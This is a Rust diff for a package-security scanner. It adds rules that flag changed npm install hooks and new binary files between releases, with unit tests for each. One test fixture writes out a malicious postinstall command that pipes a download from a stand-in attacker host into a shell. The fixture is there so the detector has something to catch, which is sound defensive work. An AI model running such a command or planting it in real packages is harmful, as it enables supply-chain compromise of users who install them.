@@ -425,6 +425,100 @@ fn resolve_composer(
 mod tests {
     use super::*;
 
+    fn package_spec(version: &str) -> PackageSpec {
+        PackageSpec {
+            name: "pkg".to_string(),
+            version: Some(version.to_string()),
+        }
+    }
+
+    fn prepared(files: &[(&str, &str)], binaries: &[&str]) -> Prepared {
+        Prepared {
+            url: "https://example.test/archive".to_string(),
+            kind: ArchiveKind::TarGz,
+            integrity: Integrity::Verified,
+            extracted: Extracted {
+                files: files
+                    .iter()
+                    .map(|(path, text)| crate::archive::ExtractedFile {
+                        path: path.to_string(),
+                        text: text.to_string(),
+                    })
+                    .collect(),
+                binaries: binaries.iter().map(|path| path.to_string()).collect(),
+                ..Extracted::default()
+            },
+            bytes: 0,
+        }
+    }
+
+    fn diff(old: &Prepared, new: &Prepared) -> DiffReport {
+        build_diff(
+            Ecosystem::Npm,
+            "pkg",
+            &package_spec("1.0.0"),
+            &package_spec("1.1.0"),
+            old,
+            new,
+            &[],
+        )
+    }
+
+    #[test]
+    fn a_changed_install_script_is_high_risk() {
+        let old = prepared(
+            &[(
+                "package/package.json",
+                r#"{"scripts":{"postinstall":"node build.js"}}"#,
+            )],
+            &[],
+        );
+        let new = prepared(
+            &[(
+                "package/package.json",
+                r#"{"scripts":{"postinstall":"curl https://evil.test | sh"}}"#,
+            )],
+            &[],
+        );
+        let report = diff(&old, &new);
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule == "DIFF-INSTALL-SCRIPTS-001")
+            .expect("missing install-script finding");
+        assert_eq!(finding.severity, crate::model::Severity::High);
+        assert!(finding.evidence.contains("curl"));
+    }
+
+    #[test]
+    fn unchanged_install_scripts_do_not_fire() {
+        let body = r#"{"scripts":{"postinstall":"node build.js"}}"#;
+        let report = diff(
+            &prepared(&[("package/package.json", body)], &[]),
+            &prepared(&[("package/package.json", body)], &[]),
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .all(|finding| finding.rule != "DIFF-INSTALL-SCRIPTS-001")
+        );
+    }
+
+    #[test]
+    fn a_new_binary_is_information() {
+        let report = diff(
+            &prepared(&[("index.js", "const a = 1;")], &[]),
+            &prepared(&[("index.js", "const a = 1;")], &["native/addon.node"]),
+        );
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule == "DIFF-NEW-BINARY-001")
+            .expect("missing binary finding");
+        assert_eq!(finding.severity, crate::model::Severity::Info);
+    }
+
     const BYTES: &[u8] = b"hello archive";
 
     #[test]
@@ -630,6 +724,110 @@ fn compare_files(
     (added, removed, modified, unchanged)
 }
 
+const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];
+
+fn package_json_path(
+    files: &[crate::archive::ExtractedFile],
+) -> Option<&crate::archive::ExtractedFile> {
+    files
+        .iter()
+        .find(|file| file.path == "package/package.json")
+        .or_else(|| {
+            files
+                .iter()
+                .find(|file| file.path.ends_with("package.json"))
+        })
+}
+
+fn install_scripts(
+    files: &[crate::archive::ExtractedFile],
+) -> Option<std::collections::BTreeMap<String, String>> {
+    let file = package_json_path(files)?;
+    let value: serde_json::Value = serde_json::from_str(&file.text).ok()?;
+    let scripts = value.get("scripts")?.as_object()?;
+    let hooks = scripts
+        .iter()
+        .filter(|(hook, _)| INSTALL_HOOKS.contains(&hook.as_str()))
+        .filter_map(|(hook, command)| {
+            command
+                .as_str()
+                .map(|command| (hook.clone(), command.to_string()))
+        })
+        .collect();
+    Some(hooks)
+}
+
+/// A version that changes or adds an install hook changed what runs during
+/// install. A risky command escalates to HIGH.
+fn install_script_findings(
+    old: &[crate::archive::ExtractedFile],
+    new: &[crate::archive::ExtractedFile],
+) -> Vec<crate::rules::RuleFinding> {
+    let Some(previous) = install_scripts(old) else {
+        return Vec::new();
+    };
+    let Some(current) = install_scripts(new) else {
+        return Vec::new();
+    };
+    let changed: Vec<(&String, &String)> = current
+        .iter()
+        .filter(|(hook, command)| previous.get(*hook) != Some(*command))
+        .collect();
+    if changed.is_empty() {
+        return Vec::new();
+    }
+    let risky = changed
+        .iter()
+        .any(|(_, command)| crate::signals::risky_install_command(command));
+    let file = package_json_path(new)
+        .map(|file| file.path.clone())
+        .unwrap_or_else(|| "package.json".to_string());
+    vec![crate::rules::RuleFinding {
+        rule: "DIFF-INSTALL-SCRIPTS-001",
+        title: "this release changed an install script",
+        description: "The new version runs a different command during installation.",
+        severity: if risky {
+            crate::model::Severity::High
+        } else {
+            crate::model::Severity::Warn
+        },
+        confidence: crate::model::Confidence::High,
+        file,
+        line: 1,
+        evidence: changed
+            .iter()
+            .map(|(hook, command)| {
+                format!("{hook}: {}", command.chars().take(120).collect::<String>())
+            })
+            .collect::<Vec<_>>()
+            .join("; "),
+        recommendation: "Review the new install command before updating.",
+        references: vec!["https://docs.npmjs.com/cli/v10/using-npm/scripts"],
+    }]
+}
+
+fn new_binary_findings(
+    old: &crate::archive::Extracted,
+    new: &crate::archive::Extracted,
+) -> Vec<crate::rules::RuleFinding> {
+    new.binaries
+        .iter()
+        .filter(|path| !old.binaries.contains(path))
+        .map(|path| crate::rules::RuleFinding {
+            rule: "DIFF-NEW-BINARY-001",
+            title: "this release adds a binary file",
+            description: "A binary appeared that the previous release did not ship.",
+            severity: crate::model::Severity::Info,
+            confidence: crate::model::Confidence::Medium,
+            file: path.clone(),
+            line: 0,
+            evidence: "(binary file, not scanned as text)".to_string(),
+            recommendation: "Confirm the binary is expected and built from this source.",
+            references: vec!["https://slsa.dev/"],
+        })
+        .collect()
+}
+
 /// New shell scripts and shebang files are worth a line in a release diff.
 fn new_script_findings(
     new_files: &[crate::archive::ExtractedFile],
@@ -696,7 +894,12 @@ pub fn build_diff(
         .filter(|finding| !old_keys.contains(&key(finding)))
         .cloned()
         .collect();
+    findings.extend(install_script_findings(
+        &old.extracted.files,
+        &new.extracted.files,
+    ));
     findings.extend(new_script_findings(&new.extracted.files, &added));
+    findings.extend(new_binary_findings(&old.extracted, &new.extracted));
     let resolved: Vec<_> = old_findings
         .into_iter()
         .filter(|finding| !new_keys.contains(&key(finding)))
